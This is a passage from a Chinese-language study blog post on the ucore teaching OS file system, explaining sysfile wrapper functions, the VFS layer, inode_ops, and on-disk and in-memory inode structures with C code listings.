class="number">0</span>);</span><br><span class="line">            ret = vfs_getcwd(iob);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlock_mm(mm);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>sysfile_getdirentry：在DIR中获取文件条目</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">sysfile_getdirentry</span><span class="params">(<span class="keyword">int</span> fd, struct dirent *__direntp)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> *<span class="title">direntp</span>;</span></span><br><span class="line">    <span class="keyword">if</span> ((direntp = kmalloc(<span class="keyword">sizeof</span>(struct dirent))) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    lock_mm(mm);</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!copy_from_user(mm, &amp;(direntp-&gt;offset), &amp;(__direntp-&gt;offset), <span class="keyword">sizeof</span>(direntp-&gt;offset), <span class="number">1</span>)) &#123;</span><br><span class="line">            ret = -E_INVAL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlock_mm(mm);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ret != <span class="number">0</span> || (ret = file_getdirentry(fd, direntp)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lock_mm(mm);</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!copy_to_user(mm, __direntp, direntp, <span class="keyword">sizeof</span>(struct dirent))) &#123;</span><br><span class="line">            ret = -E_INVAL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlock_mm(mm);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">    kfree(direntp);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>sysfile_dup：复制文件</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">sysfile_dup</span><span class="params">(<span class="keyword">int</span> fd1, <span class="keyword">int</span> fd2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> file_dup(fd1, fd2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>sysfile_pipe：创建管道（未完成）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">sysfile_pipe</span><span class="params">(<span class="keyword">int</span> *fd_store)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> -E_UNIMP;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>sysfile_mkfifo：生成命名管道（未完成）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">sysfile_mkfifo</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *__name, <span class="keyword">uint32_t</span> open_flags)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> -E_UNIMP;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这些 <code>sysfile_xx</code> 函数本质上就是更底层的 <code>file_xx</code> 函数（直接控制文件的函数）的外包装，可以说 <code>file_xx</code> 函数再外加一些对文件系统的操作就是 <code>sysfile_xx</code> 了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">file_open</span><span class="params">(<span class="keyword">char</span> *path, <span class="keyword">uint32_t</span> open_flags)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">file_close</span><span class="params">(<span class="keyword">int</span> fd)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">file_read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span> *base, <span class="keyword">size_t</span> len, <span class="keyword">size_t</span> *copied_store)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">file_write</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span> *base, <span class="keyword">size_t</span> len, <span class="keyword">size_t</span> *copied_store)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">file_seek</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">off_t</span> pos, <span class="keyword">int</span> whence)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">file_fstat</span><span class="params">(<span class="keyword">int</span> fd, struct stat *stat)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">file_fsync</span><span class="params">(<span class="keyword">int</span> fd)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">file_getdirentry</span><span class="params">(<span class="keyword">int</span> fd, struct dirent *dirent)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">file_dup</span><span class="params">(<span class="keyword">int</span> fd1, <span class="keyword">int</span> fd2)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">file_pipe</span><span class="params">(<span class="keyword">int</span> fd[])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">file_mkfifo</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">uint32_t</span> open_flags)</span></span>;</span><br></pre></td></tr></table></figure>
<p>通常来讲，这些函数都会操作当前进程访问文件的数据接口，即 <code>current-&gt;filesp</code>（这也是进程描述结构体 proc_struct 新增的条目-filesp）</p>
<h2 id="文件系统-抽象层"><a href="#文件系统-抽象层" class="headerlink" title="文件系统-抽象层"></a>文件系统-抽象层</h2><p>文件系统抽象层是把 <strong>不同文件系统</strong> 的 <strong>对外共性接口</strong> 提取出来，形成一个函数指针数组，这样，通用文件系统访问接口层只需访问文件系统抽象层，而不需关心具体文件系统的实现细节和接口（有点面向对象的味道）</p>
<p><strong>VFS虚拟文件系统-实现抽象层的技术</strong></p>
<p>系统接口（通用文件系统访问接口层）再下一层就到了 VFS 虚拟文件系统</p>
<p>虚拟文件系统（VFS）是 <strong>物理文件系统与服务之间的一个接口层</strong>（用于在文件系统与服务之间进行最初的解析），它对 Linux 的每个文件系统的所有细节进行抽象，使得不同的文件系统在 Linux 核心以及系统中运行的其他进程看来都是相同的</p>
<p>虚拟文件系统中，所使用的相关函数接口分别是 ：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vfs_init</span><span class="params">(<span class="keyword">void</span>)</span></span>; <span class="comment">// 虚拟文件系统vfs初始化</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vfs_cleanup</span><span class="params">(<span class="keyword">void</span>)</span></span>; <span class="comment">// 虚拟文件系统vfs清除</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vfs_devlist_init</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_set_curdir</span><span class="params">(struct inode *dir)</span></span>; <span class="comment">// 通过inode更改当前线程的当前目录</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_get_curdir</span><span class="params">(struct inode **dir_store)</span></span>; <span class="comment">// 检索当前线程的当前目录的inode</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_get_root</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *devname, struct inode **root_store)</span></span>; <span class="comment">// 获取名为DEVNAME的文件系统的根inode</span></span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="title">vfs_get_devname</span><span class="params">(struct fs *fs)</span></span>; <span class="comment">// 获取传入的文件系统的挂载设备名称</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_open</span><span class="params">(<span class="keyword">char</span> *path, <span class="keyword">uint32_t</span> open_flags, struct inode **inode_store)</span></span>; <span class="comment">// 打开或创建文件</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_close</span><span class="params">(struct inode *node)</span></span>; <span class="comment">// 关闭文件</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_link</span><span class="params">(<span class="keyword">char</span> *old_path, <span class="keyword">char</span> *new_path)</span></span>; <span class="comment">// 创建指向文件的硬链接</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_symlink</span><span class="params">(<span class="keyword">char</span> *old_path, <span class="keyword">char</span> *new_path)</span></span>; <span class="comment">// 创建包含内容的符号链接路径</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_readlink</span><span class="params">(<span class="keyword">char</span> *path, struct iobuf *iob)</span></span>; <span class="comment">// 将符号链接的内容读入uio(内核驱动)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_mkdir</span><span class="params">(<span class="keyword">char</span> *path)</span></span>; <span class="comment">// 创建一个目录</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_unlink</span><span class="params">(<span class="keyword">char</span> *path)</span></span>; <span class="comment">// 删除文件/目录</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_rename</span><span class="params">(<span class="keyword">char</span> *old_path, <span class="keyword">char</span> *new_path)</span></span>; <span class="comment">// 重命名文件</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_chdir</span><span class="params">(<span class="keyword">char</span> *path)</span></span>; <span class="comment">// 按名称更改当前线程的当前目录</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_getcwd</span><span class="params">(struct iobuf *iob)</span></span>; <span class="comment">// 检索当前线程当前目录的名称</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_lookup</span><span class="params">(<span class="keyword">char</span> *path, struct inode **node_store)</span></span>; <span class="comment">// 查找文件</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_lookup_parent</span><span class="params">(<span class="keyword">char</span> *path, struct inode **node_store, <span class="keyword">char</span> **endp)</span></span>; <span class="comment">// 查找父目录</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_set_bootfs</span><span class="params">(<span class="keyword">char</span> *fsname)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_get_bootfs</span><span class="params">(struct inode **node_store)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_add_fs</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *devname, struct fs *fs)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_add_dev</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *devname, struct inode *devnode, <span class="keyword">bool</span> mountable)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_mount</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *devname, <span class="keyword">int</span> (*mountfunc)(struct device *dev, struct fs **fs_store))</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_unmount</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *devname)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfs_unmount_all</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode_ops</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vop_magic;</span><br><span class="line">    <span class="keyword">int</span> (*vop_open)(struct inode *node, <span class="keyword">uint32_t</span> open_flags);</span><br><span class="line">    <span class="keyword">int</span> (*vop_close)(struct inode *node);</span><br><span class="line">    <span class="keyword">int</span> (*vop_read)(struct inode *node, struct iobuf *iob);</span><br><span class="line">    <span class="keyword">int</span> (*vop_write)(struct inode *node, struct iobuf *iob);</span><br><span class="line">    <span class="keyword">int</span> (*vop_fstat)(struct inode *node, struct stat *stat);</span><br><span class="line">    <span class="keyword">int</span> (*vop_fsync)(struct inode *node);</span><br><span class="line">    <span class="keyword">int</span> (*vop_namefile)(struct inode *node, struct iobuf *iob);</span><br><span class="line">    <span class="keyword">int</span> (*vop_getdirentry)(struct inode *node, struct iobuf *iob);</span><br><span class="line">    <span class="keyword">int</span> (*vop_reclaim)(struct inode *node);</span><br><span class="line">    <span class="keyword">int</span> (*vop_gettype)(struct inode *node, <span class="keyword">uint32_t</span> *type_store);</span><br><span class="line">    <span class="keyword">int</span> (*vop_tryseek)(struct inode *node, <span class="keyword">off_t</span> pos);</span><br><span class="line">    <span class="keyword">int</span> (*vop_truncate)(struct inode *node, <span class="keyword">off_t</span> len);</span><br><span class="line">    <span class="keyword">int</span> (*vop_create)(struct inode *node, <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">bool</span> excl, struct inode **node_store);</span><br><span class="line">    <span class="keyword">int</span> (*vop_lookup)(struct inode *node, <span class="keyword">char</span> *path, struct inode **node_store);</span><br><span class="line">    <span class="keyword">int</span> (*vop_ioctl)(struct inode *node, <span class="keyword">int</span> op, <span class="keyword">void</span> *data);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>ucore 虚拟文件系统中有四大对象：<strong>SuperBlock、inode、dentry、file</strong></p>
<ul>
<li><strong>超级块（SuperBlock）</strong></li>
</ul>
<p>超级块主要从文件系统的全局角度描述特定文件系统的全局信息，它的作用范围是整个OS空间</p>
<p>ucore 中有如下结构体来描述超级块：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sfs_super</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> magic;                                 <span class="comment">/* 魔数,必须是SFS_MAGIC */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> blocks;                                <span class="comment">/* fs中的块数 */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> unused_blocks;                         <span class="comment">/* fs中未使用的区块 */</span></span><br><span class="line">    <span class="keyword">char</span> info[SFS_MAX_INFO_LEN + <span class="number">1</span>];                <span class="comment">/* sfs的info(信息) */</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure>
<p>PS：内核通过 magic 来检查磁盘镜像是否是合法的 SFS 镜像</p>
<ul>
<li><strong>索引节点（inode）</strong></li>
</ul>
<p>UNIX 将文件的相关元数据信息（如访问控制权限、大小、拥有者、创建时间、数据内容等等信息）存储在一个单独的数据结构中，该结构被称为索引节点（每个文件都有一个 inode）</p>
<p>Linux 系统为每一个文件都分配了一个 inode 编号，这个编号中记录了文件相关的一些元信息，通过这些元信息可以用来唯一标识一个文件（操作系统上的 inode 并非无穷无尽，通常在你安装操作系统后，系统上的 inode 数量就已经确定了下来）</p>
<p>ucore 中的 inode 由如下结构体确定：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">device</span> __<span class="title">device_info</span>;</span> <span class="comment">/* 设备结点 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sfs_inode</span> __<span class="title">sfs_inode_info</span>;</span> <span class="comment">/* 文件/目录节点 */</span></span><br><span class="line">    &#125; in_info; </span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">        inode_type_device_info = <span class="number">0x1234</span>,</span><br><span class="line">        inode_type_sfs_inode_info,</span><br><span class="line">    &#125; in_type; <span class="comment">/* 类型 */</span></span><br><span class="line">    <span class="keyword">int</span> ref_count; <span class="comment">/* 引用次数 */</span></span><br><span class="line">    <span class="keyword">int</span> open_count; <span class="comment">/* 打开次数 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fs</span> *<span class="title">in_fs</span>;</span> <span class="comment">/* 相关联的文件系统 */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inode_ops</span> *<span class="title">in_ops</span>;</span> <span class="comment">/* 当前结构所对应的操作集合(inode接口) */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>接下来看看几种类型的索引结点：</p>
<p>一，磁盘索引结点——保存在硬盘中的索引结点</p>
<ul>
<li>sfs_disk_inode 结构记录了文件或目录的内容存储的索引信息，该数据结构在硬盘里储存，需要时读入内存：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sfs_disk_inode</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> size;                                  <span class="comment">/* 文件大小 */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> type;                                  <span class="comment">/* 目标类型(文件,目录,链接) */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> nlinks;                                <span class="comment">/* 此文件的硬链接 */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> blocks;                                <span class="comment">/* 此文件的块 */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> direct[SFS_NDIRECT];                   <span class="comment">/* 直接指向了保存文件内容数据的数据块索引值 */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> indirect;                              <span class="comment">/* 指向的是间接数据块 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于普通文件：索引值 direct 指向的 block 中保存的是文件中的数据</li>
<li>对于目录：索引值 direct 指向的数据保存的是目录下所有的文件名，以及对应的索引节点所在的索引块（磁盘块）所形成的数组，数据结构如下：（其实就是它就是目录项）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sfs_disk_entry</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> ino;                                   <span class="comment">/* inode编号 */</span></span><br><span class="line">    <span class="keyword">char</span> name[SFS_MAX_FNAME_LEN + <span class="number">1</span>];               <span class="comment">/* 文件名称 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>不管是文件还是目录，磁盘索引结点都需要与内存索引结点进行“绑定”，这样才可以操控磁盘上的数据</li>
<li>当 uCore 创建一个“用于存储文件/目录”的 inode 结构时（即该 inode -&gt; in_info 成员变量为 sfs_inode 类型），程序会执行函数 sfs_create_inode，该函数会将 inode -&gt; sfs_inode 成员与磁盘对应结点 sfs_disk_inode 相关联，从而使得只凭 inode 即可操作该结点</li>
<li>PS：用于描述设备 device 的 inode 会在其他函数中被初始化，不会执行函数 sfs_create_inode</li>
</ul>
<p>二，内存索引结点——保存在内存中的索引结点（inode 结构体的条目之一）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sfs_inode</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sfs_disk_inode</span> *<span class="title">din</span>;</span>                     <span class="comment">/* 磁盘索引节点 */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> ino;                                   <span class="comment">/* inode编号 */</span></span><br><span class="line">    <span class="keyword">bool</span> dirty;                                     <span class="comment">/* 如果inode被修改,则为true */</span></span><br><span class="line">    <span class="keyword">int</span> reclaim_count;                              <span class="comment">/* 如果它为&#x27;0&#x27;就杀死inode  */</span></span><br><span class="line">    <span class="keyword">semaphore_t</span> sem;                                <span class="comment">/* din(磁盘索引节点)的信号量 */</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> inode_link;                        <span class="comment">/* inode链表的入口 */</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> hash_link;                         <span class="comment">/* inode哈希链表的入口 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>SFS 中的内存 sfs_inode 包含SFS的硬盘 sfs_disk_inode 信息，而且还增加了其他一些信息，这些信息用于：判断相关硬盘位置是否改写、互斥操作、回收和快速地定位</li>
<li>PS：一个内存 sfs_inode 是在打开一个文件后才创建的，如果关机则相关信息都会消失，而硬盘 sfs_disk_inode 的内容是保存在硬盘中的，只是在进程需要时才被读入到内存中，用于访问文件或目录的具体内容数据</li>
</ul>
<p>三，文件结点——用于指向磁盘索引结点的结点（有助于硬链接的实现）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sfs_disk_entry</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> ino; <span class="comment">/* inode编号(指向了sfs_disk_inode磁盘索引结点) */</span></span><br><span class="line">    <span class="keyword">char</span> name[SFS_MAX_FNAME_LEN + <span class="number">1</span>]; <span class="comment">/* 文件名称 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>inode-&gt;in_ops 指向 inode 接口，是对常规文件、目录、设备文件所有操作的一个抽象函数表示</p>
<p>对于某一具体的文件系统中的文件或目录，只需实现相关的函数，就可以被用户进程访问具体的文件了（用户进程无需了解具体文件系统的实现细节）</p>
<p>inode_ops 采用如下结构体进行组织：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode_ops</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vop_magic;</span><br><span class="line">    <span class="keyword">int</span> (*vop_open)(struct inode *node, <span class="keyword">uint32_t</span> open_flags);</span><br><span class="line">    <span class="keyword">int</span> (*vop_close)(struct inode *node);</span><br><span class="line">    <span class="keyword">int</span> (*vop_read)(struct inode *node, struct iobuf *iob);</span><br><span class="line">    <span class="keyword">int</span> (*vop_write)(struct inode *node, struct iobuf *iob);</span><br><span class="line">    <span class="keyword">int</span> (*vop_fstat)(struct inode *node, struct stat *stat);</span><br><span class="line">    <span class="keyword">int</span> (*vop_fsync)(struct inode *node);</span><br><span class="line">    <span class="keyword">int</span> (*vop_namefile)(struct inode *node, struct iobuf *iob);</span><br><span class="line">    <span class="keyword">int</span> (*vop_getdirentry)(struct inode *node, struct iobuf *iob);</span><br><span class="line">    <span class="keyword">int</span> (*vop_reclaim)(struct inode *node);</span><br><span class="line">    <span class="keyword">int</span> (*vop_gettype)(struct inode *node, <span class="keyword">uint32_t</span> *type_store);</span><br><span class="line">    <span class="keyword">int</span> (*vop_tryseek)(struct inode *node, <span class="keyword">off_t</span> pos);</span><br><span class="line">    <span class="keyword">int</span> (*vop_truncate)(struct inode *node, <span class="keyword">off_t</span> len);</span><br><span class="line">    <span class="keyword">int</span> (*vop_create)(struct inode *node, <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">bool</span> excl, struct inode **node_store);</span><br><span class="line">    <span class="keyword">int</span> (*vop_lookup)(struct inode *node, <span class="keyword">char</span> *path, struct inode **node_store);</span><br><span class="line">    <span class="keyword">int</span> (*vop_ioctl)(struct inode *node, <span class="keyword">int</span> op, <span class="keyword">void</span> *data);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>inode 结构是与文件系统相关的，<strong>不同文件系统所实现的 inode 结构是不同的</strong>（主要体现在 inode_ops 条目），它的存在可以让 VFS 忽略更下一级的文件系统差异，使之注重于提供一个统一的文件系统接口</p>
<p>inode_ops 根据其 in_info 的不同而实现其不同的功能：（目录，文件，外设）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sfs特定的dir操作对应于inode上的抽象操作</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inode_ops</span> <span class="title">sfs_node_dirops</span> =</span> &#123;</span><br><span class="line">    .vop_magic                      = VOP_MAGIC,</span><br><span class="line">    .vop_open                       = sfs_opendir,</span><br><span class="line">    .vop_close                      